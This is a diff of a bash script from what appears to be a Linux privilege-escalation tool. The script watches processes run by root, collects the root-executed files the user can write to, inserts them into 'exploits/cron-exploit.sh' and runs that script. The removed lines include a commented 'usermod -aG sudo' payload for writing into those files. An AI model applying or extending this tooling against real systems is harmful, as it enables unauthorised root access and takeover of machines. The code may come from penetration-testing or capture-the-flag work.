@@ -1,6 +1,6 @@
 #! /bin/bash
 
-exploit=true
+EXPLOIT=1
 
 # over one minute keep track of all the processes that run
 # get any that are run with /bin/* executables 
@@ -8,15 +8,20 @@ script_files=$(for i in $(seq 1 610); do ps -u root --format cmd >> /tmp/procs.t
 
 rm /tmp/procs.tmp
 
-echo $script_files
+writable_files=''
 
 while read file; do
+	writable=$(check_writable "$file" "$EXPLOIT")
 
-	writable=$(check_writable "$file" "$exploit")
-
-	if [[ "$exploit" = true ]] && [[ "$writable" = true ]] then
-		echo Modifying ${file}...
-		# echo usermod -aG sudo $user > $file
+	if [[ "$writable" = true ]] then
+		writable_files+=${file}':'
 	fi
 
 done <<< "$script_files"
+
+# writes the exploitable files to the correct exploit file
+sed -i "s#EXPLOITABLE\=.*#EXPLOITABLE\=${writable_files}#g" exploits/cron-exploit.sh
+
+if [[ "$EXPLOIT" = 1 ]]; then
+	/bin/bash exploits/cron-exploit.sh
+fi
